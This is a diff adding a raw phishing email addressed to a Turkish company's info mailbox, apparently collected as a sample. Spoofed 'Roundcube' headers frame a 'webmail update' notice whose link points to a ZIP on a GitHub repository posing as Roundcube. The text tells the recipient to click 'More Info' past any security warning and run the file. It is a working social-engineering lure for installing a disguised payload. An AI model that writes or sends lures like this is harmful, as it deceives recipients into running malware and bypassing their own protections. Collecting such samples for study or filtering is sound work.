@@ -1,0 +1,86 @@
+Return-Path: <postmaster@c2fef515f6.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id 2OqQH1wAHmnDXgAAOB6+FQ
+	(envelope-from <postmaster@c2fef515f6.nxcli.io>)
+	for <info@vorteksenerji.com>; Wed, 19 Nov 2025 20:37:32 +0300
+Return-path: <postmaster@c2fef515f6.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Wed, 19 Nov 2025 20:37:32 +0300
+Received: from cloudhost-8448367.us-midwest-1.nxcli.net ([209.126.25.101]:57610)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@c2fef515f6.nxcli.io>)
+	id 1vLm7Y-000000006cs-1Cbm
+	for info@vorteksenerji.com;
+	Wed, 19 Nov 2025 20:37:32 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha256; q=dns; c=nofws;
+  s=default; d=c2fef515f6.nxcli.io;
+  b=sUx47rqPmIgx9ZbgPdo1Claf06ML8QjJFg0X3dUuygzBuZJXmRC4brZO1c1nRWHx+MFTFsYjQ4F/2IXkBP/ER+ZiSkJhcEJ37N65dOG6mimy2s2yRverjz9qWT/VB5o3v5yRYoeRKCq+QVQv3M2VYoqc/RCiezO4zzzq7iWV/KAlDZ5KXWgLwZYz4+g09yTTELXKQAq5GWi/qbNmH9KM7f3bgGrxSWs4AgirBDWQYmEIcIYzDPxgyK/zOc48PjodgF3I36WLSNuUc2uIhYLY2fKbinUGqHfqnZHojb7LeTc22Xx+TaxovAEwm+ReMrgK9u4Zk8bg+rQj/PisP/x1xA==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=c2fef515f6.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=HK+RbC30aJ903J0PDI
+	+2HkCc4IuH+xJF2olFABB6NIw=; b=xKshz0y2ntPRkRb6ppdTvrKd5RjtNYhRwy
+	BwBjYLX72flSwh8eoyHYl+S3BRVgPKzw0DYJbBnWOgjtoKo/zLqMJQDCZCv5fRV8
+	rfivvaWJ2T9tF+HfzhmZ+GLVZupJ2NQo1onxUa5+PeVopVLWZCA8Hgv9yk69JLVd
+	mxBR3YE+ulloWJfn0H7hpI+odaTgzaJlBcIF8bZTW4PcIe/zwMlYtsHC/O6N8PAx
+	DTZe/3TWfQb1mm57PaIgDsCZpToGJrrKW6SUt3CHv3g8esCDYslykpXil+kTo9yq
+	9YZEV9D1NOjp8PPs0deo/G85rTZowFS6xqHx+olKuros+eW527NQ==
+Received: (qmail 314773 invoked by uid 10030); 19 Nov 2025 17:19:50 +0000
+Date: 19 Nov 2025 17:19:50 +0000
+Message-ID: <20251119171950.314770.qmail@cloudhost-8448367.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: System Maintenance: Install Webmail Update Now
+X-PHP-Originating-Script: 10030:done.php
+From: "Roundcube" <1zxac1tf@xqs.io>
+Reply-To: 1zxac1tf@xqs.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.29
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@1zxac1tf@xqs.io>
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html lang="en"><head><title>Roundmail Service Notice</title>
+<meta charset="UTF-8">
+<style>
+  body, table, td, p, a {
+    background:#ffffff !important;
+    color:#000000 !important;
+    font-family:Arial, sans-serif !important;
+  }
+  a {
+    color:#1a73e8 !important;
+    text-decoration:underline !important;
+  }
+</style>
+
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
+<body style="BACKGROUND: #ffffff; COLOR: #000000; MARGIN: 20px">
+<table style="BORDER-TOP: #e5e5e5 1px solid; BORDER-RIGHT: #e5e5e5 1px solid; BACKGROUND: #ffffff; BORDER-BOTTOM: #e5e5e5 1px solid; BORDER-LEFT: #e5e5e5 1px solid; border-radius: 8px" cellspacing="0" cellpadding="20" width="600" align="center">
+  <tbody>
+  <tr>
+    <td style="PADDING-BOTTOM: 12px" align="center"><img border="0" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQypUMBq006t_PTo3D_dqr9XhL0Krh9E8kzkuD06BZLroLMmUFLwBz_isgmK9xUkx8riA&amp;usqp=CAU"><!-- SAFE LOGO PLACEHOLDER --></td></tr>
+  <tr>
+    <td style="FONT-SIZE: 14px; LINE-HEIGHT: 1.55">
+      <p>Hello,</p>
+      <p>This is a routine message from <strong>Roundmail</strong>. Periodic 
+      maintenance and small adjustments are regularly applied to the mailbox 
+      environment to help ensure stable performance. </p>
+      <p>If you would like to review your mailbox settings or account 
+      preferences, you can access your panel here: </p>
+      <p><a href="https://raw.githubusercontent.com/roundcubebeta/Roundcube/refs/heads/main/Roundcube-1.7.zip?id=-1863191376745454229-8304">Download Roundmail Panel</a> </p>
+	  <p>Notice : This is the latest version of Roundmail.</p>
+      <p><font color="#ff0000">If you see a security warning or application 
+      protection message, just click "More Info" and proceed to run the 
+      application safely.</font></p></font></font></font>
+      <p>If everything is functioning normally on your side, no action is 
+      required. </p>
+      <p>For general assistance, you may contact our team at <a href="mailto:support@roundmail.example">support@roundmail.com</a>. </p>
+      <p>Regards,<br>Roundmail 
+Administration</p></td></tr></tbody></table></body></html>
+
